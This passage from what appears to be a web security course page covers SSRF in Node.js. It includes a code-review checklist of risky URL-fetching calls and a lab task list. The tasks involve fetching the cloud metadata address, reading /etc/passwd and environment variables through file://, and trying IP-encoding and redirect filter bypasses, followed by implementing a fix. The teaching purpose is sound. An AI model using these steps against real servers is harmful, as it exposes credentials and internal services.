  fetches the image URL, but the attacker provides an internal URL. The response may be binary
  (the server expected an image), but the request still reaches the internal service.
</p>

<h3>XML External Entity (XXE) + SSRF</h3>
<p>
  If your Node.js application parses XML (RSS feeds, SOAP, SVG uploads), XXE can trigger SSRF.
  The XML document references an external entity at an internal URL, and the XML parser fetches it.
  This is a compound vulnerability — XXE providing the SSRF vector.
</p>

<div class="callout info">
  <div class="callout-title">SSRF Checklist for Code Review</div>
  <div class="callout-text">
    When reviewing Node.js code, flag any use of: <code>axios.get(userInput)</code>,
    <code>fetch(userInput)</code>, <code>http.get(userInput)</code>,
    <code>request(userInput)</code>, <code>got(userInput)</code>,
    <code>superagent.get(userInput)</code>, <code>puppeteer.goto(userInput)</code>,
    <code>page.setContent(htmlWithUserURLs)</code>. Every one of these is a potential SSRF
    vector if the URL or content comes from user input.
  </div>
</div>

<hr>

<h2>Lab 17 Checklist</h2>

<ul class="task-list">
  <li><span class="task-check"></span> Build the vulnerable /api/preview endpoint that fetches any user-provided URL without validation</li>
  <li><span class="task-check"></span> Exploit basic SSRF to access the internal admin panel via localhost and extract credentials</li>
  <li><span class="task-check"></span> Demonstrate cloud metadata exfiltration by fetching http://169.254.169.254/ (or simulate it locally)</li>
  <li><span class="task-check"></span> Test file:// protocol abuse to read /etc/passwd and environment variables from the server</li>
  <li><span class="task-check"></span> Set up a blind SSRF test using a webhook endpoint and an out-of-band detection server</li>
  <li><span class="task-check"></span> Attempt filter bypasses: decimal IP, hex IP, IPv6 loopback, DNS pointing to 127.0.0.1, and redirect chains</li>
  <li><span class="task-check"></span> Implement the complete SSRF fix with protocol allowlist, DNS resolution, private IP check, and redirect blocking</li>
  <li><span class="task-check"></span> Verify each bypass attempt is blocked by the fix, then enable IMDSv2 enforcement (if on AWS)</li>
</ul>

<div class="section-nav">
  <button class="nav-btn" data-prev="smuggling">Back: HTML Smuggling</button>
  <button class="nav-btn" data-next="capstone">Next: Full App Challenge</button>
</div>

`;
